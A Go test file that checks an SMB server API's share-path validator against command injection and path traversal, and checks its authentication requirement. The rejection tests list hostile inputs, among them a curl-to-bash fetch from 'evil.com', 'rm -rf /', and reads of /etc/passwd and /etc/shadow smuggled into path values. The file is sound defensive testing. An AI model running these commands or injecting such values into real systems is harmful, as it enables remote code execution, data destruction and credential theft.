package httpapi_test

import (
	"net/http/httptest"
	"strings"
	"testing"

	"smb-server/backend/internal/httpapi"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ── ValidSharePath regex ──────────────────────────────────────────────────────

func TestValidSharePath_AcceptsSafePaths(t *testing.T) {
	for _, p := range []string{
		"/mnt/shared/docs",
		"/srv/data/team-01",
		"/mnt/nas/backup",
		"/data/share_2024",
		"/mnt/a",
		"/z",
	} {
		assert.True(t, httpapi.ValidSharePath.MatchString(p), "should accept %q", p)
	}
}

func TestValidSharePath_RejectsInjectionAndUnsafePaths(t *testing.T) {
	for _, p := range []string{
		"/tmp/x; curl evil.com | bash",
		"/path with spaces",
		"/path/../etc/passwd",
		"relative/path",
		"",
		"/mnt/share\nwhoami",
		"/mnt/$(cat /etc/passwd)",
		"/mnt/`id`",
		"/mnt/share&rm -rf /",
		"/mnt/share|cat /etc/shadow",
	} {
		assert.False(t, httpapi.ValidSharePath.MatchString(p), "should reject %q", p)
	}
}

// ── Share create HTTP integration ─────────────────────────────────────────────

func TestShareCreate_RejectsCommandInjectionPath(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"evil","path":"/tmp/x; curl evil.com | bash","comment":""}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 400, resp.StatusCode)
}

func TestShareCreate_RejectsPathTraversal(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"escape","path":"/mnt/../etc/passwd","comment":""}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 400, resp.StatusCode)
}

func TestShareCreate_AcceptsValidPath(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"docs","path":"/mnt/shared/docs","comment":"Documentation"}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 201, resp.StatusCode)
}

func TestShareCreate_RequiresAuth(t *testing.T) {
	app := setupTestApp(t)

	body := `{"name":"docs","path":"/mnt/shared/docs","comment":""}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 401, resp.StatusCode)
}
